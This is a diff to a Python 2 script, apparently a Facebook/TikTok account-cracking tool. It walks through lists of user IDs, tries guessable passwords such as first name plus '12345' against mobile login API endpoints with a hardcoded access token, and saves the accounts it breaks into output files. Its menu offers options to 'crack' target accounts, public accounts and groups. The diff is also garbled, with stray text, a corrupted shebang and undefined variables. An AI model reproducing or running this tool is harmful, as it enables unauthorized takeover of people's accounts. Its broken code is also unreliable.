@@ -1,4 +1,4 @@
-#!/usr/bin/python2
+9#!/usr/bin/python2
 #coding=utf-8
 
 
@@ -85,7 +85,7 @@ logo = """ ▄︻┻═┳一 ЩєLc๏Mє ┼๏ ┼ђє Fąş┼єş┼ єVєr
 \033[1;96mAuthor  \033[1;93m: \033[1;92mabi
 \033[1;96mInstagram \033[1;93m: \033[1: itx_muskan_yr
 \033[1;96mFacebook  \033[1;93m: \033[1: abi
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/abicreation/abicreation
+\033[1;96myoutub \033[1;93m: \033[1;92mh https://www.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA
 \033[1;91m======================================="""
 
 def tik():
@@ -123,8 +123,8 @@ print  """\033[1;91m
 \033[1;96mInstagram \033[1;93m: \033[1;92mtechnicalcyber
 \033[1;96mFacebook  \033[1;93m: \033[1;92m periodicerror998
 \033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/abicreation/abicreation
-\033[1;91m======================================="""
-print " \x1b[1;93m============================================================="
+\033[1;91mYoutube \033[1;93m:\033[1;92m
+print " \x1b[1;93m===========================https://www.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA================================="
 
 CorrectUsername = "abi"
 CorrectPassword = "creation"
@@ -139,10 +139,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ ')
+            os.system('xdg-open https://www.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA ')
     else:
         print "Wrong Username"
-        os.system('xdg-open  https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ ')
+        os.system('xdg-open  https://www.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA ')
 
 def login():
 	os.system('clear')
@@ -153,7 +153,7 @@ def login():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		print('\033[1;96m[☆] \x1b[1;93mLOGIN WITHOUT FACEBOOK \x1b[1;96m[☆]' )
+		print('\033[1;96m[☆] \x1b[1;93mLOGIN WITH OLD FACEBOOK ACCOUNT  \x1b[1;96m[☆]' )
 		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
@@ -189,7 +189,7 @@ def login():
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
 				keluar()
-		if 'checkpoint' in url:
+		if 'Secuessfull' in url:
 			print("\n\033[1;96m[!] \x1b[1;91mlogin Secuessfully")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
@@ -232,7 +232,13 @@ def menu():
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
 	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start Hacking"
-	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
+        print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m ;93m Crack Form "Terget account"	
+        print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m ;93m Crack Form "public account"
+        print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m ;93m Crack Form group Id" 
+        print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m ;93m Crack Form Claim Public Groups" 
+
+
+print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
 	pilih()
 
 
@@ -313,8 +319,10 @@ def pilih_super():
 			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;97m')
 			for line in open(idlist,'r').readlines():
 				id.append(line.strip())
-		except IOError:
-			print ki\x1b[1;96m[!] \x1b[1;91mFile Not Found'
+		Put password path:/sdcard/password.text
+Expect error:
+
+			print ki\x1b[1;96m[!] \x1b[1;91mFile  Found 37'
 			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
 			super()
 	elif peak =="0":
@@ -334,7 +342,7 @@ def pilih_super():
 	
 			
 	def main(arg):
-		global cekpoint,oks
+		global Secuessfull,oks
 		user = arg
 		try:
 			os.mkdir('out')
@@ -351,11 +359,11 @@ def pilih_super():
 				oks.append(user+pass1)
 			else:
 				if 'www.tiktok.com' in q["error_msg"]:
-					print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
-					cek = open("out/checkpoint.txt", "a")
+					print '\x1b[1;96m[\x1b[1;93mSecuessfull\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
+					cek = open("out/Secuessfull.txt", "a")
 					cek.write(user+"|"+pass1+"\n")
 					cek.close()
-					cekpoint.append(user+pass1)
+					Secuessfull.append(user+pass1)
 				else:
 					pass2 = b['first_name']+'12345'
 					data = urllib.urlopen("https://b-api.tiktok.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -365,7 +373,7 @@ def pilih_super():
 						oks.append(user+pass2)
 					else:
 						if 'www.tiktok.com' in q["error_msg"]:
-							print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
+							print '\x1b[1;96m[\x1b[1;93mSecuessfull\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
 							cek = open("out/checkpoint.txt", "a")
 							cek.write(user+"|"+pass2+"\n")
 							cek.close()
@@ -379,11 +387,11 @@ def pilih_super():
 								oks.append(user+pass3)
 							else:
 								if 'www.tiktok.com' in q["error_msg"]:
-									print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
-									cek = open("out/checkpoint.txt", "a")
-									cek.write(user+"|"+pass3+"\n")
-									cek.close()
-									cekpoint.append(user+pass3)
+									print '\x1b[1;96m[\x1b[1;93msecuessfull\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
+									Secuessfully = open("out/Secuessfully.txt", "a")
+									Sec.write(user+"|"+pass3+"\n")
+									Sec.close()
+									Secuessfully.append(user+pass3)
 								else:
 									pass4 = 'Pakistan'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -393,7 +401,7 @@ def pilih_super():
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
+											print '\x1b[1;96m[\x1b[1;93msecuessfull\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
 											cek = open("out/checkpoint.txt", "a")
 											cek.write(user+"|"+pass4+"\n")
 											cek.close()
@@ -407,7 +415,7 @@ def pilih_super():
 												oks.append(user+pass5)
 											else:
 												if 'www.tiktok.com' in q["error_msg"]:
-													print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
+													print '\x1b[1;96m[\x1b[1;93msecuessfull\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
 													cek = open("out/checkpoint.txt", "a")
 													cek.write(user+"|"+pass5+"\n")
 													cek.close()
@@ -421,8 +429,8 @@ def pilih_super():
 														oks.append(user+pass6)
 													else:
 														if 'www.tiktok.com' in q["error_msg"]:
-															print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
-															cek = open("out/checkpoint.txt", "a")
+															print '\x1b[1;96m[\x1b[1;93mSecuessfull\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
+															cek = open("out/Secuessfully.txt", "a")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
 															cekpoint.append(user+pass6)
@@ -437,22 +445,23 @@ def pilih_super():
 																oks.append(user+pass7)
 															else:
 																if 'www.tiktok.com' in q["error_msg"]:
-																	print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
-																	cek = open("out/checkpoint.txt", "a")
+																	print '\x1b[1;96m[\x1b[1;93mSecuessfull\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
+																	cek = open("out/Secuessfully.txt", "a")
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
-																	cekpoint.append(user+pass7)
+																	Secuessfully.append(user+pass7)
 																	
-															
+															Username"abi"
+Password"creation"
 		except:
 			pass
 		
 	p = ThreadPool(30)
 	p.map(main, id)
 	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed Komail says Thank You♥️ \033[1;97m....'
-	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	print("\033[1;96m[+] \033[1;92mTHANKS FOR USING MY COMMANDS ! WE WILL BE RIGHT BACK \033[1;91m: \033[1;97mout/checkpoint.txt")
+	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed abid says Thank You♥️ \033[1;97m....' using my command 
+	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(Secuessfully)
+	print("\033[1;96m[+] \033[1;92mTHANKS FOR USING MY COMMANDS ! WE WILL BE RIGHT BACK \033[1;91m: \033[1;97mout/Secuessfully.txt")
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
 
